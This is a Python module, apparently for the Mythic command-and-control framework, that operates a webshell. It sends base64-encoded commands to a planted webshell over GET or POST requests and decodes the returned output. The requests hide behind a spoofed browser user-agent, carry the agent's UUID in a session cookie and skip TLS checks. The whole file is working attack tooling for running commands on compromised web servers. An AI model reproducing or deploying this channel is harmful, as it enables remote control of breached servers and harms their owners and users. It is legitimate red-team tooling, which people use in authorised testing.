import aiohttp
import base64
import logging
import json
from mythic_container.MythicCommandBase import *
from mythic_container.MythicGoRPC.send_mythic_rpc_callback_edge_search import *

# Configure the logger
logger = logging.getLogger(__name__)

async def GetRequest(uuid: str, message: bytes, taskData: PTTaskMessageAllData) -> bytes:
    """
    Send a GET request to the webshell with a command, and return the decoded response in JSON format.
    """
    edges_query = await SendMythicRPCCallbackEdgeSearch(MythicRPCCallbackEdgeSearchMessage(
        AgentCallbackUUID=taskData.Callback.AgentCallbackID,
        SearchActiveEdgesOnly=True
    ))

    if not edges_query.Success:
        logger.debug("Failed to query edges: %s", edges_query.Error)
    elif len(edges_query.Results) > 0:
        logger.debug(edges_query.Results)
        return b''

    # Extract configuration parameters from taskData
    param_name = taskData.C2Profiles[0].Parameters.get("query_param", "id")
    cookie_name = taskData.C2Profiles[0].Parameters.get("cookie_name", "session")
    user_agent = taskData.C2Profiles[0].Parameters.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36")
    target_url = taskData.C2Profiles[0].Parameters["url"]

    # Encode the message and UUID
    encoded_uuid = base64.b64encode(uuid.encode('UTF-8'))
    #final_message = taskData.Callback.AgentCallbackID.encode() + message
    final_message = base64.b64encode(message)

    try:
        async with aiohttp.ClientSession(headers={'User-Agent': user_agent},
                                         cookies={cookie_name: encoded_uuid.decode('UTF-8')}) as session:
            async with session.get(target_url, ssl=False, params={param_name: final_message.decode('UTF-8')}) as resp:
                return await ProcessRequest(resp)
    except Exception as e:
        logger.exception(f"GET request failed: {e}")
        raise Exception(f"GET request failed: {e}")

async def PostRequest(uuid: str, message: bytes, taskData: PTTaskMessageAllData):
    """
    Send a POST request to the webshell with a command, and return the decoded response in JSON format.
    """
    edges_query = await SendMythicRPCCallbackEdgeSearch(MythicRPCCallbackEdgeSearchMessage(
        AgentCallbackUUID=taskData.Callback.AgentCallbackID,
        SearchActiveEdgesOnly=True
    ))

    if not edges_query.Success:
        logger.debug("Failed to query edges: %s", edges_query.Error)
    elif len(edges_query.Results) > 0:
        logger.debug(edges_query.Results)
        return b''

    # Extract configuration parameters from taskData
    param_name = taskData.C2Profiles[0].Parameters.get("query_param", "id")
    cookie_name = taskData.C2Profiles[0].Parameters.get("cookie_name", "session")
    user_agent = taskData.C2Profiles[0].Parameters.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36")
    target_url = taskData.C2Profiles[0].Parameters["url"]

    # Encode the message and UUID
    encoded_uuid = base64.b64encode(uuid.encode('UTF-8'))
    #final_message = taskData.Callback.AgentCallbackID.encode() + message
    final_message = base64.b64encode(message)

    # Construct the body of the POST request with the correct 'id' field
    payload = {
        param_name: final_message.decode('UTF-8')  # Ensure 'id' contains the Base64-encoded command
    }

    try:
        async with aiohttp.ClientSession(headers={'User-Agent': user_agent},
                                         cookies={cookie_name: encoded_uuid.decode('UTF-8')}) as session:
            async with session.post(target_url, ssl=False, json=payload) as resp:
                return await ProcessRequest(resp)
    except Exception as e:
        logger.exception(f"POST request failed: {e}")
        raise Exception(f"POST request failed: {e}")

async def ProcessRequest(resp):
    response_data = await resp.text()

    if resp.status == 200 and response_data:
        try:
            # Parse the JSON response from the webshell
            response_json = json.loads(response_data)
            if 'output' in response_json:
                return base64.b64decode(response_json['output'].encode("utf-8"))
            else:
                logger.exception("No 'output' field in the response.")
                raise Exception("No 'output' field in the response.")
        except json.JSONDecodeError as e:
            logger.exception(f"Failed to decode JSON response: {e}")
            raise Exception(f"Failed to decode JSON response: {e}")
    else:
        logger.exception(f"Webshell response error: {resp.status} {response_data}")
        raise Exception(f"Webshell response error: {resp.status} {response_data}")